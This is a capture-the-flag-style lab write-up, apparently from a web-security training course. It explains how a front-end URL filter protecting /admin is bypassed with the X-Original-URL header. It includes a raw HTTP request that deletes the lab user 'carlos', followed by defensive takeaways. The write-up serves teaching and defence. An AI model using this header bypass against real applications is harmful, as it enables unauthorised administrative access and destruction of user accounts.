# Lab: URL-based access control can be circumvented

## Description
This lab contains an access control vulnerability where the application's URL-based security filter can be bypassed using non-standard HTTP headers.

## Analysis
The application has an administrative interface at `/admin`. A front-end security filter blocks access to this URL. However, the application uses the `X-Original-URL` or `X-Rewrite-URL` header to determine the target path.

If we send a request to a non-blocked URL but include the `X-Original-URL: /admin` header, the filter might allow the request, and the application will process it as a request to `/admin`.

## Exploitation
I need to delete the user `carlos`.

### Steps
1. Navigate to `/admin`. You get a "403 Forbidden" response.
2. Send a request to `/` but include the header `X-Original-URL: /admin`.
3. The response should now show the admin panel.
4. To delete carlos, send a request to `/` with the header: `X-Original-URL: /admin/delete?username=carlos`.

## Payload
```text
GET / HTTP/1.1
X-Original-URL: /admin/delete?username=carlos
```

## Takeaways
- Front-end security filters must be consistent with the back-end application's routing logic.
- Avoid using non-standard headers for routing or access control unless they are strictly necessary and properly secured.
- Always prefer back-end, code-level authorization checks.
